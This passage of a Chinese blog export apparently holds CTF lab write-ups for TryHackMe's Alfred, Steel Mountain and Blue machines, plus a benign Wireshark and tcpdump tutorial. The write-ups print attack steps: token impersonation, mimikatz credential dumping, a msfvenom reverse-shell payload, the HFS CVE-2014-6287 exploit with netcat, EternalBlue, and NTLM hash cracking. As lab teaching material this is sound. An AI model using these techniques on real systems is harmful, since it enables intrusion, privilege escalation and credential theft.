Service(LSASS.exe)完成。\n访问令牌时描述进程或线程的安全上下文对象。令牌中的信息包括与进程或线程关联的用户帐户的身份和权限。当用户登录时，系统通过将其与存储在安全数据库中的信息进行比较来验证用户的密码，如果密码是经过身份认证的，系统会生成一个访问令牌。代表此用户执行的每个进程都有此访问令牌的副本。\n当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来识别用户。访问令牌包含以下信息：\n\n用户帐户的安全标识符(SID)\n用户所属组的 SID\n标识当前登录会话的登录 SID\n用户或用户组拥有的权限列表\n所有者 SID\n主要组的 SID\n当用户在未指定安全描述符的情况下创建安全对象时系统使用的默认DACL\n访问令牌的来源\n令牌是主要令牌还是模拟令牌\n限制 SID的可选列表\n当前模拟级别\n其他统计\n\n有两种类型的访问令牌：\n\n主要访问令牌：与登录时生成的用户帐户相关联的令牌，用于描述与该进程关联的用户帐户的安全上下文。\n模拟令牌：允许特定进程(或进程中的线程)使用另一个(用户&#x2F;客户端)进程的令牌访问资源。\n\n对于模拟令牌，有不同的级别：\n\nSecurityAnonymous(匿名)：当前用户&#x2F;客户端不能冒充另一个用户&#x2F;客户端\nSecurityIdentification(识别)：当前用户&#x2F;客户端可以获取客户端的身份和权限，但不能冒充客户端\nSecurityImpersonation(模拟)：当前用户&#x2F;客户端可以在本地系统上模拟客户端的安全上下文\nSecurityDelegation(委托)：当前用户&#x2F;客户端可以在远程系统上模拟客户端的安全上下文\n\n其中安全上下文是包含用户相关安全信息的数据结构。\n帐户的权限允许用户执行特定操作。以下是最常被滥用的特权(具体含义可以参考Priv2Admin)：\n\nSeImpersonatePrivilege\nSeAssignPrimaryPrivilege\nSeTcbPrivilege：\nSeBackupPrivilege\nSeRestorePrivilege\nSeCreateTokenPrivilege\nSeLoadDriverPrivilege\nSeTakeOwnershipPrivilege\nSeDebugPrivilege\n\n\n在反shell会话中运行whoami /priv查看当前帐户拥有的权限。可以看到当前帐户拥有SeDebugPrivilege、SeChangeNotifyPrivilege、SeImpersonatePrivilege、SeIncreaseWorkingSetPrivilege四个权限，其中的SeDebugPrivilege、SeImpersonatePrivilege可以被MetaSploit的incognito module利用。\n在meterpreter会话中运行load incognito加载模块，加载成功后运行运行list_tokens -g查看可用的令牌。在Delegation Tokens Available(可用的委托令牌)列表下，发现了BUILTIN\\Administrators是可用的。使用impersonate_token &quot;BUILTIN\\Administrators&quot;命令模拟管理员令牌。至此，已经取得了管理员权限。由于Windows处理权限的方式，它使用进程的主令牌而不是模拟令牌来确定进程能做什么不能做什么，所以即使获得了管理员的模拟令牌，也可能没有管理员的权限。为了拿到最终的flag，我们需要使用meterpreter的migrate命令将进程迁移到正在运行的进程中(使用ps查看具有管理员权限的进程)。\n\n\n\n\n\n\nincognito module\nIncognito最初是一个独立的应用程序，允许在成功入侵系统时模拟用户令牌。这被集成到Metasploit并最终集成到Meterpreter。\n\n\n后渗透Mimikatz 是一款功能强大的轻量级调试神器，通过它可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从lsass.exe进程中获取当前登录系统用户名的密码。\n\n\n\n\n\n\n提示\n注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。\n\nMetasploit6中，mimikatz被替换为kiwi。在meterpreter会话中使用load kiwi加载扩展，成功后执行help kiwi。\n\ncreds_all：列举所有凭据\nreds_kerberos：列举所有kerberos凭据\ncreds_msv：列举所有msv凭据\ncreds_ssp：列举所有ssp凭据\ncreds_tspkg：列举所有tspkg凭据\ncreds_wdigest：列举所有wdigest凭据\ndcsync：通过DCSync检索用户帐户信息\ndcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID\ngolden_ticket_create：创建Golden Tickets\nkerberos_ticket_list：列举kerberos Tickets\nkerberos_ticket_purge：清除kerberos Tickets\nkerberos_ticket_use：使用kerberos Tickets\nkiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令\nlsa_dump_sam：dump出lsa的SAM\nlsa_dump_secrets：dump出lsa的密文\npassword_change：修改密码\nwifi_list：列出当前用户的wifi配置文件\nwifi_list_shared：列出共享wifi配置文件&#x2F;编码\n\n使用kiwi_cmd sekurlsa::logonpasswords抓取密码,获得了用户bruce的明文密码。\n使用工具\n\n\n\n\n\n\n\n\n\nNamp\nMetaSploit\nmsfvenom\nNishang\nmimikatz\n\n参考文档\n\n\n\n\n\n\n\n\n\nMSFVenom - CheatSheet\nPowerShell for Pentester: Windows Reverse Shell\nAccess Tokens\nAbusing Token Privileges For LPE\nMimikatz使用大全 \n\n","slug":"Alfred","date":"2022-03-21T13:36:36.816Z","categories_index":"CTF","tags_index":"tryhackme,Alfred,Nishang,Windows Privilege Escalation","author_index":"剑三"},{"id":"11041d9251423dbeb0d78e2c3336a544","title":"Steel Mountain CTF - TryHackMe.com","content":"\n\n\n\n\n\n\n\n\nSteel Mountain是TryHackMe的Windows靶机，基于Mr Robot Tv系列。\n侦察探测开启TryHackMe靶机后，使用ping命令检测主机是否启动并运行。ping命令执行成功后，使用nmap进行端口扫描。从扫描结果中可以发现，这个靶机运行了SMB服务(445)，RDP服务(3389)以及两个web服务(80,8080)。访问80端口的web服务，。这里有一个小工具TinEye,根据图片反向查找包含该图片的网址链接，这在我们分析网站时可能会提供意想不到的效果。\n获取访问在扫描的结果中，我们还看到了8080也是开启的，打开网页发现是靶机上部署了一个HFS文件服务器。在exploit-db搜索hfs发现该服务的特定版本存在存在可以利用的漏洞.使用nmap扫描版信息。拿到后，使用Metasploit查找该服务的expolit。从结果中看到该服务确实存在exploit，利用Metasploit进行exploit。此漏洞的payload默认使用windows&#x2F;meterpreter&#x2F;reverse_tcpMetasploit已经打开了meterpreter会话，那接下来就可以进行提权了。\nMetaSploit特权升级靶机建议使用PowerUp进行提权，PowerUP所做的事情就是寻找可能存在的漏洞，帮助提权。\n查看当前的metepreter会话的用户，为STEELMOUNTAIN\\bill,要使用PowerUP需要将PowerUP.ps1文件使用upload命令上传到靶机上。上传成功后，需要在Meterpreter shell中使用load powershell加载Powershell，并输入powershell_shell切换到Powershell，接下来执行PowerUp.ps1,然后输入Invoke-AllChecks，这会在靶机上运行一系列扫描。从PowerUp的扫描结果中我们发现AdvancedSystemcareService9服务存在Unquoted Service Paths(UPS)漏洞。\n\n\n\n\n\n\n\n\n\n知识点：Unquoted Service Path 是什么？当一个服务被创建，其可执行路径包含空格并且没有被引号括起来时，会导致USP漏洞。这个漏洞允许用户获得特殊权限(只有当这个易受攻击的服务是以System权限运行)。在Windows中，如果服务没有用引号括起来并且有空格，它会将空格作为中断处理，并将服务路径的其他部分作为参数传递。知识点：LocalSystem？LocalSystem是预设的拥有本机所有权限的本地账户，这个账户跟通常的用户账户没有任何关联，也没有用户名和密码之类的凭证。这个服务账户可以打开注册表的HKEY_LOCAL_MACHINE\\Security键，当LocalSystem访问网络资源时，它是作为计算机的域账户使用的。 \n根据已经获取的信息进行分析，目前靶机上运行的AdvancedSystemcareService9服务存在USP漏洞，并且使用LocalSystem权限运行。如果利用USP漏洞将AdvancedSystemcareService9服务替换成恶意程序(例如反向Shell.exe),则该服务会在系统重启或服务重启时自动启动，我们就能在靶机上运行一个拥有LocalSystem权限的会话。\n接下来，我们使用msfvenom制作恶意程序，并且程序名称需要命名为“Advanced.exe”，因为系统顺序寻找执行文件:1.C:\\Program.exe2.C:\\Program Files(x86)\\IObit\\Advanced.exe\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.4.63.84 LPORT&#x3D;5555 -f exe -o .&#x2F;Advanced.exe\n\n-p: 选择一个payload\n-f: 生成的文件格式\n-o: 生成路径\n\n生成成功后使用upload命令将“Advanced.exe”上传至C:\\Program Files(x86)\\IObit\\目录下。另起一个MetaSploit窗口，使用exploit&#x2F;multi&#x2F;handler进行监听,修改options和默认payload。在Meterpreter会话中使用shell命令进入Windows shell会话中，停止和重启AdvancedSystemcareService9服务。重启服务后，exploit/multi/handler获得meterpreter会话。此时的会话并不稳定，我们需要使用migrate命令快速的将会话迁移到以NT AUTHORITY\\System运行的进程下。\n手动特权升级在手动提权的部分，靶机提供了一个新的CVE2014-6287(HttpFileServer 2.3.x Remote Command Execution),这个漏洞提供了一个可利用Python文件，只需修改IP与端口就可以使用。要利用这个exploit，我们需要通过http服务器托管netcat并设置一个netcat监听器来捕获反向shell。完整版Kali会在/usr/share/windows-resources/binaries/nc.exe目录中提供 Netcat Windows 二进制文件。\n获取反向Shell\n修改rejetto.py文件中的主机和端口：...\nip_addr = \"192.168.44.128\" #攻击的IP地址\nlocal_port = \"4444\" # nc监听的端口\n...\n开启http 服务:python3 -m http.server 80\n开启nc监听：nc -lvnp 4444\n执行rejetto.py文件：python3 rejetto.py &lt;靶机IP&gt; &lt;HFS端口&gt;此时，我们已经在nc监听处获得了靶机的shell会话。\n\n主机枚举\n\n\n\n\n\nWindows Privilege Escalation Awesome Scripts(WinPEAS)\nWinPEAS是Windows本地提权工具，它通过枚举windows系统上的各种信息(包括但不限于系统信息、日志、网络、进程、应用、DLL劫持等)，来确定是否存在可以提权的漏洞。\n\nChecklist - Local Windows Privilege Escalation\nWindows Local Privilege Escalation\n\n\n\n我们将winPEASx64.exe下载到本地机器，并托管到http服务上，然后使用Powershell wget下载到靶机上。使用-h命令查看winPEAS可以检测的清单信息，由于已知靶机存在USP漏洞，我们选择servicesinfo选项来进行枚举。\n\n\n\n\n\n\nServices Info清单\n\nInteresting services (non Microsoft) information\nModifiable services\nWritable service registry binpath\nPATH Dll Hijacking\n\n\n\n在检测结果看到有几个unqouted路径服务可以利用，但这并不意味着我们有权编辑或写入它们。使用icacls命令检查Advanced SystemCare路径的权限,可以看到该用户拥有读写执行权限(RX,W)。现在可以确定利用该服务进行USP漏洞攻击可以完成特权升级，剩下的内容就跟MetaSploit攻击的后半部分一致。利用msfvenom生成恶意程序，并获取系统级权限的反向shell会话。\n工具\n\n\n\n\n\n\n\n\n\nNamp\nMetaSploit\nmsfvenom\nPowerSploit\nwinPEAS\n\n参考文档\n\n\n\n\n\n\n\n\n\npowerup提权的方法\nPowerSploit\nWindows Privilege Escalation — Part 1 (Unquoted Service Path)\n内置系统账户:Local system&#x2F;Network service&#x2F;Local Service 区别\nGet-ModifiablePath\nwindows中使用icacls命令还原重置文件夹的权限设置\n\n","slug":"Steel Mountain CTF","date":"2022-03-17T17:29:47.695Z","categories_index":"CTF","tags_index":"tryhackme,Windows Privilege Escalation,Steel Mountain,PowerSploit,winPEAS","author_index":"剑三"},{"id":"9f9fe3f3013b488c2450ed12f2446a41","title":"Linux网络抓包","content":"通过网络抓包功能捕获指定IP和端口的网络数据包、分析数据包内容，帮助定位网络故障和分析攻击行为，从而识别出网络通信的安全风险,常用的网络抓包工具有wireshark、tcpdump、ngrep等。\n网络抓包环境网络不论传输什么样的数据，最终通过物理层传输的都是二进制，类似010101的bit流。想要进行抓包操作，就需要具备相应的网络环境。\n本地环境本地环境直接抓包本地网卡的进出的流量。不需要借助交换机就能抓取网络通信流量，这是最基本的抓包方式。\n交换机环境交换机环境是更为常见的方式，包括了端口镜像、ARP欺骗、MAC泛洪。\n网络抓包原理\n\n\n\n\n\n\n\n\nlibpcap flow involving data copy from kernel to user space.\nlibpcap(Packet Capture Library)数据包捕获函数库,是Unix&#x2F;Linux平台下的网络数据包捕获函数(Windows WinPcap)，它是一个独立于系统的用户层包捕获的API接口，为底层网络监测提供了一个可移植的框架。wireshark(linux)、tcpdupm、ngrep等抓包工具都依赖libpcap库。\n\nlibpcap主要由两部分组成：\n\n网络分接头(Network Tap):网络分接头从网络设备驱动程序（NIC driver）中收集数据拷贝，过滤器决定是否接收该数据包。\n数据过滤器(Packet Filter):libpcap 利用 BSD Packet Filter (BPF) 算法对网卡接收到的链路层数据包进行过滤。\n\nBPF 算法的基本思想：在有 BPF 监听的网络中，网卡驱动将接收到的数据包复制一份交给 BPF 过滤器，过滤器根据用户定义的规则决定是否接收此数据包以及需要拷贝该数据包的哪些内容，然后将过滤后的数据交给与过滤器相关联的上层应用程序。\nlibpcap 的包捕获机制：在数据链路层加一个旁路处理。当一个数据包到达网络接口时，libpcap 首先利用已经创建的类型为 PF_PACKET 的 Socket ，从位于链路层中的 NIC driver 中获得数据包的拷贝，再通过 Tap 函数将数据包发给 BPF 过滤器。BPF 过滤器根据用户已经定义好的过滤规则对数据包进行逐一匹配，匹配成功则放入内核缓冲区，进而传递给用户缓冲区，匹配失败则直接丢弃。如果没有设置过滤规则，所有数据包都将放入内核缓冲区，并传递给用户缓冲区。\nlibpcap使用流程:\n\n决定对那一个接口进行嗅探，如eth0。我们也可以用一个字符串来定义这个设备。\n\n初始化pcap。使用文件句柄传入需要嗅探的设备。同时支持多个设备的嗅探。\n\n设置BPF. 创建一个规则集合，编译并且使用它。这个过程分为三个阶段: \n\n1.规则集合被置于一个字符串内，并且被转换成能被pcap读的格式。\n2.编译该规则（就是调用一个不被外部程序使用的函数）。\n3.告诉pcap使用它来过滤数据包。\n\n\npcap进入它的主循环。在这个阶段内pcap一直工作到它接收了所有我们想要的包为止。每当它收到一个包（或者多个数据包）就调用另一个已经定义好的函数，这个函数可以做我们想要的任何工作，比如它可以剖析包的上层协议信息并给用户打印出结果，它可以将结果保存为一个文件，或者什么也不作。\n\n在嗅探到所需的数据后，我们要关闭会话并结束。\n\n\n\n\n\n\n\n\n\n\n\nTips: Python的Scapy库是一个强大的操纵报文的交互程序。它可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。Scapy 可以轻松地做到像扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)这样的传统任务。\n网络抓包工具由于wireshark(linux)、tcpdump、ngrep等工具都依赖的是libpcap库，所以抓取数据包、过滤数据包的方式都是一致的。\nwireshark：通过Protocol-Tree、Dissectors(包含700中协议)、Plugins可以对pcap文件(libpcap生成的文件)中的协议内容进行解码，并通过Display-Filters引擎进行过滤显示(协议与过滤字段)。\ntcpdump：对截获的数据并没有进行彻底解码，数据包内的大部分内容是使用十六进制的形式直接打印输出的。显然这不利于分析网络故障，通常的解决办法是先使用带-w参数的tcpdump 截获数据并保存到文件中，然后再使用其他程序(如Wireshark)进行解码分析。\nngrep：ngrep工具是grep命令的网络版，ngrep用于抓包，并可以通过正则表达式，过滤、获取指定样式的数据包。比起tcpdump查看更加方便，但是需要自行安装。\nWireSharkWireshark（导线鲨鱼，前称Ethereal，空灵）是一个免费开源的网络数据包分析软件。网络数据包分析软件的功能是截取网络数据包，并尽可能显示出最为详细的网络数据包资料。\n在GNU通用公共许可证的保障范围底下，用户可以以免费的代价获取软件与其代码，并拥有针对其源代码修改及定制的权利。（摘自维基百科）\n过滤器Wireshark有两种过滤器，一种是捕捉过滤器，一种是显示过滤器。\n捕捉过滤器：\n\n只抓取符合设置规则的数据包，并丢弃其他信息；\n是数据经过的第一层过滤器，用于控制捕捉数据的数量，以避免产生过大的日志文件\n\n显示过滤器：\n\n显示过滤器并不会丢弃信息，只是将不符合规则的数据隐藏起来；\n允许在日志文件中迅速准确地找到所需要的记录；\n\n它们的共同点就是都得遵循BPF规则语法。\n捕捉过滤器语法\n名词解释：\n\nProtocol(协议)常用值：ether、fddi、ip、arp、rarp、decnet、lat、sca、moprc、mopdl、tcp and udp等。如果没有特别指明某种协议，则默认使用所有支持的协议。  \nDirection(方向)常用值：src、dst、src and dst、src or dst。如果没有特别指明来源或目的地，则默认使用src or dst作为关键字。\nHost(s)：常用值：net、port、host、portrange。如果没有特别指定值，则默认使用host关键字。\nLogical Operations(逻辑运算)常用值：not、and、or。否(“not”)具有最高的优先级。或(“or”)和与(“and”)具有相同的优先级，运算时从左至右进行。\n\n常用BPF示例:\n来源或目的地是指定地址的包\nhost 192.168.0.123\nhost www.taobao.com\n\n范围内的包\nnet 192.168.0.0&#x2F;24\nor\nnet 192.168.0.0 mask 255.255.255.0\n\n抓取目的地是某范围的包\ndst net 192.168.0.0&#x2F;24\nor\ndst net 192.168.0.0 mask 255.255.255.0\n\n抓取来源是某范围的包\nsrc net 192.168.0.0&#x2F;24\nor\nsrc net 192.168.0.0 mask 255.255.255.0\n\n仅抓取DNS(端口是53)的包\nport 53\n\ntcp dst port 3128\n显示目的TCP端口为3128的封包。\n\nip src host 10.1.1.1\n显示来源IP地址为10.1.1.1的封包。\n\nhost 10.1.2.3\n显示目的或来源IP地址为10.1.2.3的封包。\n\nsrc portrange 2000-2500\n显示来源为UDP或TCP，并且端口号在2000至2500范围内的封包。\n\nnot imcp\n显示除了icmp以外的所有封包。（icmp通常被ping工具使用）\n\nsrc host 10.7.2.12 and not dst net 10.200.0.0&#x2F;16\n显示来源IP地址为10.7.2.12，但目的地不是10.200.0.0&#x2F;16的封包。\n\n(src host 10.4.1.12 or src net 10.6.0.0&#x2F;16) and tcp dst portrange 200-10000 and dst net 10.0.0.0&#x2F;8\n显示来源IP为10.4.1.12或者来源网络为10.6.0.0&#x2F;16，目的地TCP端口号在200至10000之间，并且目的位于网络10.0.0.0&#x2F;8内的所有封包。\n显示过滤器语法\n名词解释：\n\nProtocol(协议)可以使用大量位于OSI模型第2至7层协议。常用值：IP、TCP、DNS、SSH\nString1，String2(可选项)协议的子类。(例如：ip.checksum.status)\nComparison operators(比较运算符)\nLogical expressions(逻辑运算符)\n\n常见BPF示例：\n过滤从某地址发出的请求\nip.src&#x3D;&#x3D;192.168.8.60\n\n过滤发送到某地址的请求\nip.dst&#x3D;&#x3D;192.168.8.60\n\n过滤http协议\nhttp\n\n过滤某地址\nhttp.request.uri&#x3D;&#x3D;&quot;&#x2F;projectname&#x2F;a.html&quot;\n\n过滤全地址（它与uri的区别是，包含host）\nhttp.request.full_uri&#x3D;&#x3D;&quot;www.mydomain.com&#x2F;projectname&#x2F;a.html&quot;\n\nsnmp || dns || icmp\t\n显示SNMP或DNS或ICMP封包。\n\nip.addr &#x3D;&#x3D; 10.1.1.1\n显示来源或目的IP地址为10.1.1.1的封包。\n\nip.src !&#x3D; 10.1.2.3 or ip.dst !&#x3D; 10.4.5.6\n显示来源不为10.1.2.3或者目的不为10.4.5.6的封包。\n\nip.src !&#x3D; 10.1.2.3 and ip.dst !&#x3D; 10.4.5.6\n显示来源不为10.1.2.3并且目的IP不为10.4.5.6的封包。\n\n\ntcp.port &#x3D;&#x3D; 25\t\n显示来源或目的TCP端口号为25的封包。\n\ntcp.dstport &#x3D;&#x3D; 25\t\n显示目的TCP端口号为25的封包。\n\ntcp.flags\t\n显示包含TCP标志的封包。\n\ntcp.flags.syn &#x3D;&#x3D; 0x02\t\n显示包含TCP SYN标志的封包。\n\n如果对某些不熟悉的协议要进行过滤的话，可以通过Display Filter Expression菜单查看所有支持的协议表达式：\n报文解析Wireshark捕捉的数据报文展示从物理层-&gt; 以太网 -&gt; 协议层。不同的协议层，展示的报文信息都不尽相同。\n物理层\n# 19号帧， 线路98字节，实际捕获98字节\nFrame 19: 98 bytes on wire (784 bits), 98 bytes captured (784 bits) on interface -, id 0\n    \n    # 接口id\n    Interface id: 0 (-)    \n    \n    # 封装类型\n    Encapsulation type: Ethernet (1)    \n    \n    # 捕获时间\n    Arrival Time: May 20, 2021 22:03:00.811570000 中国标准时间    \n    [Time shift for this packet: 0.000000000 seconds]\n    Epoch Time: 1621519380.811570000 seconds\n\n    # 此包与前1个捕获帧的时间间隔\n    [Time delta from previous captured frame: 1.000881000 seconds]\n\n    # 此包与前1个显示帧的时间间隔\n    [Time delta from previous displayed frame: 1.000881000 seconds]\n\n    # 此包与第1帧的时间间隔\n    [Time since reference or first frame: 19.309028000 seconds]\n\n    # 帧序号\n    Frame Number: 19\n\n    # 帧长度\n    Frame Length: 98 bytes (784 bits)\n\n    # 捕获长度\n    Capture Length: 98 bytes (784 bits)\n\n    # 此帧是否做了标记：否\n    [Frame is marked: False]\n\n    # 此帧是否被忽略：否\n    [Frame is ignored: False]\n\n    # 帧内封装的协议层次结构\n    [Protocols in frame: eth:ethertype:ip:icmp:data]\n\n    # 著色标记的协议名词\n    [Coloring Rule Name: ICMP]\n    \n    # 著色规则\n    [Coloring Rule String: icmp || icmpv6]\n以太网层\n# 源MAC地址，目标MAC地址\nEthernet II, Src: 0c:fc:d4:00:52:00 (0c:fc:d4:00:52:00), Dst: 0c:fc:d4:fb:76:00 (0c:fc:d4:fb:76:00)\n\n    # 目标MAC地址\n    Destination: 0c:fc:d4:fb:76:00 (0c:fc:d4:fb:76:00)\n        Address: 0c:fc:d4:fb:76:00 (0c:fc:d4:fb:76:00)\n\n        #  LG位：全局唯一地址（出厂默认）\n        .... ..0. .... .... .... .... &#x3D; LG bit: Globally unique address (factory default)\n\n        # LG位：独特地址（单广播）\n        .... ...0 .... .... .... .... &#x3D; IG bit: Individual address (unicast)\n    \n    # 源MAC地址\n    Source: 0c:fc:d4:00:52:00 (0c:fc:d4:00:52:00)\n        Address: 0c:fc:d4:00:52:00 (0c:fc:d4:00:52:00)\n        .... ..0. .... .... .... .... &#x3D; LG bit: Globally unique address (factory default)\n        .... ...0 .... .... .... .... &#x3D; IG bit: Individual address (unicast)\n\n    # Type代表以太网帧中封装了何种协议，常见的有IPv4: 0x0800、ARP:0x0806、IPV6: 0x86DD等...\n    Type: IPv4 (0x0800)\nTCP三次握手在进行分析之前，先看下TCP&#x2F;IP的报文格式：\n\nSYN（SYNchronization）标志：当 SYN 被置为 1，而 ACK 为0时， 说明这是一个连接请求报文段，若对方同意建立连接，则应在应答报文中将 SYN 和 ACK 都置为 1。\nACK（ACKnowlegment）：仅当 ACK 被置为 1 时，确认号字段才有效。 TCP 规定在连接建立后的所有传输报文都必须把 ACK 置 1。\nFIN（Finish）：用来释放一个连接。 当 FIN 被置 1 时，说明此报文的发送方的数据已经发送完毕，要求释放连接。\nRST（Reset）：当该位有效时，表面 TCP 连接中出现严重错误，比如一方中途崩溃，或者网络极度拥塞，导致大面积丢包，数据长时间无法到达对方，则接下来的传输必须重新建立。该位还可以用来拒绝一个非法的报文段。\nPSH（Push）：当PSH 被置为1 时， 会被立即推出，不会等待其他数据进入缓冲区。当接受端收到 PSH 被置 1 的数据包时，立即将该分段上交到对应的应用程序。(这就是SSH协议基于TCP的同时又可以对用户输入的短小指令可以快速响应的原因)\nURG（Urgent）：此标志位逐渐被淘汰。\n\n\n通过在GNS3模拟访问过程，并进行监听：Pc1为Server端：\nimport socket        \n \ns = socket.socket()  \nhost = '192.168.1.2' \nport = 12345         \ns.bind((host, port)) \n \ns.listen(5)          \nwhile True:\n    c,addr = s.accept()  \n    print '连接地址：', addr\n    c.send('welcome gns3 server')\n    c.close() \nPc2为Client端：\nimport socket               \n \ns = socket.socket()         \nhost = '192.168.1.2' \nport = 12345               \n \ns.connect((host, port))\nprint s.recv(1024)\ns.close()\n执行代码后在Wireshark显示器中可以看到8个TCP数据包传输：第一次握手:客户端传送一个TCP，标志位为SYN&#x3D;1，序号seq为Sequence number&#x3D;0， 40338 -&gt; 12345，代表客戶端请求建立连接第二次握手:服务器向客户端返回一个数据包，SYN&#x3D;1，ACK&#x3D;1，12345 -&gt; 40338，将确认序号设定为客户端的序号seq+1，即0+1&#x3D;1第三次握手:客户端收到服务器发来的包后检查确认序号(Acknowledgement Number)是否正确，即第一次传送的序号seq加1（X+1&#x3D; 0+1&#x3D;1）。以及标志位ACK是否为1。若正确，客户端会再向服务器端传送一个数据包，SYN&#x3D;0，ACK&#x3D;1，确认序号(Acknowledgement Number)&#x3D;Y+1&#x3D;0+1&#x3D;1，并且把服务器发来ACK的序号seq(Sequence number)加1传送给对方，传送序号seq为X+1&#x3D; 0+1&#x3D;1。客户端收到后确认序号值与ACK&#x3D;1，53992 -&gt; 80，至此，一次TCP连线就此建立。\n","slug":"Linux网络抓包","date":"2022-03-17T17:29:47.691Z","categories_index":"Linux","tags_index":"network,libpcap,抓包","author_index":"剑三"},{"id":"f0b7d768b5cba845448b4aeeb8a9d261","title":"Blue CTF - TryHackMe.com","content":"Blue CTF专注于通过利用SMB漏洞、使用Meterpreter提升权限、破解NTLM哈希以及遍历目录找到3个Flag。\n侦察开启TryHackMe上的靶机，使用ping命令检查主机是否启动并开始运行。\n确认靶机已经启动后，使用Nmap执行TCP SYN(sS)端口扫描，并对端口服务进行漏洞扫描(--script=vuln)，同时将其输出到blueNmapOutPut(-OA)。\nsudo nmap 10.10.120.227 -sS --script&#x3D;vuln -oA blueNmapOotPut\n\n漏洞扫描的输出表明当前靶机存在MS17-010SMB漏洞。MS17-010允许攻击者在Windows系统上执行远程代码，靶机使用了SMBv1,并且没有更新Window安全更新(4013389),导致该漏洞依旧存在。\n获得访问权得知靶机可以存在MS2017-010漏洞后，使用Metasploite搜索MS17-010 exploit。\n在msfconsole的搜索结果中，我们选择使用广泛流传的ms_17_010_eternalblue(永恒之蓝)漏洞进行攻击。\n查看options,修改必要的参数：RHOSTS、LHOST，然后设置Playload。\n执行runorexploit。\nEternalBlue漏洞利用成功，我们已经拿到了靶机的的shell权限。\n权限升级为了对靶机进行权限升级，我们需要将shell会话升级为Meterpreter会话。Meterpreter允许攻击者像shell一样与靶机交互，并为攻击提供了利用DLL注入机器内存直接执行Metasploit Playload的功能。\nDLL注入是恶意软件使用的一种代码注入形式，通过强制合法进程将恶意DLL加载到进程内存中来执行恶意代码。DLL注入的工作原理是在合法进程中分配内存，并将恶意DLL的路径复制到合法进程地址空间分配的内存中。然后使用指向Windows的LoadLibrary()函数的指针执行一个新线程，并使用DLL的路径名指向分配的内存，从而允许执行恶意代码。\n为了将shell升级到Meterpreter会话，我使用了Metasploit的shell_to_meterpreter模块。执行Ctrl + z让刚获得的shell会话转入后台运行。\n使用Metasploit搜索shell_to_meterpreter。\n查看options,修改必要的参数：SESSION(此处设置为我们隐藏在后台的shell id编号),执行exploit。\n成功后通过session命令可以看到我们已经获得了meterpreter会话。\n为了将权限提升到NT AUTHORITY，我们需要劫持靶机上一个NT AUTHORITY\\SYSTEM用户下的合法进程。进入meterpreter会话使用ps命令查看当前靶机上运行的进程都有哪些。\n最终，我们选择劫持SearchIndexer.exe进程，使用migrate命令将meterpreter会话迁移到SearchIndexer.exe进程中，成功后，使用getuid查看当前用户。\n劫持SearchIndexer.exe进程使我们能够以NT AUTHORITY\\SYSTEM执行代码，使用hashdump(post&#x2F;windwos&#x2F;gather&#x2F;hashdump)命令获取Windows用户账号的密码哈希值，该命令会转储安全账号管理器(SAM)数据库的内容。SAM数据库文件存储了Windows操作系统(包括Windwos 10)上的散列用户密码。\n破解密码哈希转储的Windows用户凭证使用NTLM进行哈希处理。转储凭据可以分为4个部分：用户、相对标识符(RID)、LM哈希和NT哈希。例如，用户Jon的凭据可以拆分为：\n\n用户名:Jon\nRID: 1000\nLM Hash: aad3b435b51404eeaad3b435b51404ee\nNT Hash: ffb43f0de35be4d9917ac0cc8ad57f8d\n\n为了破解密码，将凭据中的NT Hash复制到文件中，使用HashCat对NT哈希执行wordlist攻击。攻击词表使用kali中自带的rockyou.txt。\nhashcat -m 1000 -a 0 .&#x2F;hashes.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rock\n\n-a: 指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击\n-m: 指定要破解的hash类型，如果不指定类型，则默认是MD5(NTLM类型为1000)\n\n\n寻找Flag使用search命令查找匹配flag*.txt的文件,使用cat命令查看文件，获取flag。\n参考文档\n\n\n\n\n\n\n\n\n\nWindows系统的dll注入\n后渗透之meterpreter使用攻略\nPRIVILEGE ESCALATION\nHackTheBox Writeup: Grandpa\n\n","slug":"Blue CTF","date":"2022-03-17T17:29:47.327Z","categories_index":"CTF","tags_index":"tryhackme,Windows Privilege Escalation,eternalblue","author_index":"剑三"}]